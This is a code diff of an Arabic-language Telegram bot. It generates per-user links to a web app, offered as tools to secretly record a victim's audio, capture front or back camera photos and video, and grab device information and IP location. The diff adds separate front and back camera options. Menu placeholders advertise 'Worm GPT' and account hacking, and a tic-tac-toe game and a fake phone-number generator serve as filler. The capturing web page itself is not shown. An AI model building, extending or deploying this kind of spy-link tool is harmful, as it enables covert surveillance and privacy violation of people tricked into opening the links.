@@ -3,17 +3,17 @@ import random
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
 
-TOKEN = "YOUR_BOT_TOKEN_HERE"
-WEB_URL = "https://your-app-name.up.railway.app"
+TOKEN = os.environ.get("TOKEN", "ضع_التوكن_هنا")
+WEB_URL = os.environ.get("WEB_URL", "https://your-railway-app.up.railway.app")
 DEVELOPER_URL = "https://t.me/Y_TZZZZ"
 
-# حالات لعبة XO
 xo_games = {}
 
 def get_main_menu():
     keyboard = [
-        [InlineKeyboardButton("🎙️ تسجيل الصوت", callback_data="audio"), InlineKeyboardButton("📸 التقاط صورة", callback_data="photo")],
-        [InlineKeyboardButton("🎥 تسجيل فيديو", callback_data="video"), InlineKeyboardButton("🕵️‍♂️ معلومات الجهاز", callback_data="info")],
+        [InlineKeyboardButton("🎙️ تسجيل الصوت", callback_data="audio"), InlineKeyboardButton("📸 كاميرا أمامية", callback_data="front_photo")],
+        [InlineKeyboardButton("📷 كاميرا خلفية", callback_data="back_photo"), InlineKeyboardButton("🎥 فيديو أمامي", callback_data="front_video")],
+        [InlineKeyboardButton("🎥 فيديو خلفي", callback_data="back_video"), InlineKeyboardButton("🕵️‍♂️ معلومات الجهاز", callback_data="info")],
         [InlineKeyboardButton("🎮 لعبة XO", callback_data="xo"), InlineKeyboardButton("🌐 تتبع IP", callback_data="iptrack")],
         [InlineKeyboardButton("📞 ارقام وهمية", callback_data="fakenum"), InlineKeyboardButton("👨‍💻 التواصل مع المطور", url=DEVELOPER_URL)],
         [InlineKeyboardButton("➕ المميزات الأخرى", callback_data="more")]
@@ -29,12 +29,8 @@ def get_more_menu():
     return InlineKeyboardMarkup(keyboard)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "مرحباً بك اختر من القائمة:",
-        reply_markup=get_main_menu()
-    )
+    await update.message.reply_text("مرحباً بك اختر من القائمة:", reply_markup=get_main_menu())
 
-# --- منطق لعبة XO ---
 def render_xo_board(board):
     keyboard = []
     for i in range(0, 9, 3):
@@ -48,113 +44,69 @@ def render_xo_board(board):
     return InlineKeyboardMarkup(keyboard)
 
 def check_winner(board):
-    win_conditions = [
-        [0, 1, 2], [3, 4, 5], [6, 7, 8], # صفوف
-        [0, 3, 6], [1, 4, 7], [2, 5, 8], # أعمدة
-        [0, 4, 8], [2, 4, 6]             # أقطار
-    ]
+    win_conditions = [[0, 1, 2], [3, 4, 5], [6, 7, 8], [0, 3, 6], [1, 4, 7], [2, 5, 8], [0, 4, 8], [2, 4, 6]]
     for cond in win_conditions:
-        if board[cond[0]] == board[cond[1]] == board[cond[2]] != " ":
-            return board[cond[0]]
-    if " " not in board:
-        return "Tie"
+        if board[cond[0]] == board[cond[1]] == board[cond[2]] != " ": return board[cond[0]]
+    if " " not in board: return "Tie"
     return None
 
-async def xo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    user_id = query.from_user.id
-    
-    if query.data == "xo":
-        xo_games[user_id] = [" "]*9
-        await query.edit_message_text("🎮 لعبة XO\nتلعب X ضد البوت (O):", reply_markup=render_xo_board(xo_games[user_id]))
-        return
-
-    if query.data == "xo_quit":
-        del xo_games[user_id]
-        await query.edit_message_text("تم إلغاء اللعبة.", reply_markup=get_main_menu())
-        return
-
-    if query.data.startswith("xo_move_"):
-        if user_id not in xo_games:
-            await query.answer("اللعبة انتهت، ابدأ لعبة جديدة.")
-            return
-        
-        idx = int(query.data.split("_")[-1])
-        board = xo_games[user_id]
-        
-        if board[idx] != " ":
-            await query.answer("هذا المربع ممتلئ!")
-            return
-            
-        board[idx] = "❌" # حركة اللاعب
-        
-        winner = check_winner(board)
-        if winner:
-            await query.edit_message_text(f"النتيجة: {winner}!", reply_markup=get_main_menu())
-            del xo_games[user_id]
-            return
-
-        # حركة البوت
-        empty_spots = [i for i, spot in enumerate(board) if spot == " "]
-        if empty_spots:
-            bot_move = random.choice(empty_spots)
-            board[bot_move] = "⭕"
-            
-        winner = check_winner(board)
-        if winner:
-            if winner == "Tie":
-                await query.edit_message_text("تعادل! 🤝", reply_markup=get_main_menu())
-            else:
-                await query.edit_message_text(f"النتيجة: {winner}!", reply_markup=get_main_menu())
-            del xo_games[user_id]
-        else:
-            await query.edit_message_text("دورك (X):", reply_markup=render_xo_board(board))
-
-# --- معالج الأزرار ---
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
     user_id = query.from_user.id
 
-    # التعامل مع لعبة XO
-    if data == "xo" or data.startswith("xo_move") or data == "xo_quit":
-        await xo_handler(update, context)
+    if data == "xo":
+        xo_games[user_id] = [" "]*9
+        await query.edit_message_text("🎮 لعبة XO\nتلعب X ضد البوت (O):", reply_markup=render_xo_board(xo_games[user_id]))
+        return
+    if data == "xo_quit":
+        if user_id in xo_games: del xo_games[user_id]
+        await query.edit_message_text("تم إلغاء اللعبة.", reply_markup=get_main_menu())
+        return
+    if data.startswith("xo_move_"):
+        if user_id not in xo_games: return
+        idx = int(data.split("_")[-1])
+        board = xo_games[user_id]
+        if board[idx] != " ": return
+        board[idx] = "❌"
+        winner = check_winner(board)
+        if winner:
+            await query.edit_message_text(f"النتيجة: {winner}!", reply_markup=get_main_menu())
+            del xo_games[user_id]
+            return
+        empty_spots = [i for i, spot in enumerate(board) if spot == " "]
+        if empty_spots: board[random.choice(empty_spots)] = "⭕"
+        winner = check_winner(board)
+        if winner:
+            msg = "تعادل! 🤝" if winner == "Tie" else f"النتيجة: {winner}!"
+            await query.edit_message_text(msg, reply_markup=get_main_menu())
+            del xo_games[user_id]
+        else:
+            await query.edit_message_text("دورك (X):", reply_markup=render_xo_board(board))
         return
 
-    # القوائم
     if data == "back":
         await query.edit_message_text("مرحباً بك اختر من القائمة:", reply_markup=get_main_menu())
-        return
     elif data == "more":
         await query.edit_message_text("اختر ميزة إضافية:", reply_markup=get_more_menu())
-        return
-
-    # توليد أرقام وهمية
-    if data == "fakenum":
+    elif data == "fakenum":
         country = random.choice(["+1", "+44", "+966", "+213", "+20"])
         number = f"{country} {random.randint(100, 999)} {random.randint(100, 999)} {random.randint(1000, 9999)}"
         await query.edit_message_text(f"📞 رقم وهمي جاهز:\n`{number}`", parse_mode="Markdown", reply_markup=get_main_menu())
-        return
-
-    # الميزات التي تحتاج رابط الويب
-    if data in ["audio", "photo", "video", "info", "iptrack"]:
+    elif data in ["audio", "info", "iptrack"]:
         link = f"{WEB_URL}/?chatId={user_id}&type={data}"
-        await query.edit_message_text(
-            f"اضغط على الرابط لبدء العملية:\n{link}\n\nانتظر قليلاً حتى يتم التحميل...",
-            reply_markup=get_main_menu()
-        )
-        return
-
-    # مميزات أخرى (نصية)
-    if data == "email":
-        await query.edit_message_text("📧 ميزة إنشاء الإيميل قيد التطوير.", reply_markup=get_more_menu())
-    elif data == "genimg":
-        await query.edit_message_text("🖼️ ميزة توليد الصور قيد التطوير.", reply_markup=get_more_menu())
-    elif data == "gpt":
-        await query.edit_message_text("🤖 Worm GPT قيد التطوير.", reply_markup=get_more_menu())
-    elif data == "hack":
-        await query.edit_message_text("📱 ميزة اختراق الحساب قيد التطوير.", reply_markup=get_more_menu())
+        await query.edit_message_text(f"اضغط على الرابط لبدء العملية:\n{link}\n\nانتظر قليلاً...", reply_markup=get_main_menu())
+    elif data == "front_photo":
+        await query.edit_message_text(f"اضغط لبدء الكاميرا الأمامية:\n{WEB_URL}/?chatId={user_id}&type=photo&facing=user", reply_markup=get_main_menu())
+    elif data == "back_photo":
+        await query.edit_message_text(f"اضغط لبدء الكاميرا الخلفية:\n{WEB_URL}/?chatId={user_id}&type=photo&facing=environment", reply_markup=get_main_menu())
+    elif data == "front_video":
+        await query.edit_message_text(f"اضغط لبدء الفيديو الأمامي:\n{WEB_URL}/?chatId={user_id}&type=video&facing=user", reply_markup=get_main_menu())
+    elif data == "back_video":
+        await query.edit_message_text(f"اضغط لبدء الفيديو الخلفي:\n{WEB_URL}/?chatId={user_id}&type=video&facing=environment", reply_markup=get_main_menu())
+    elif data in ["email", "genimg", "gpt", "hack"]:
+        await query.edit_message_text("هذه الميزة قيد التطوير.", reply_markup=get_more_menu())
 
 if __name__ == '__main__':
     app = ApplicationBuilder().token(TOKEN).build()
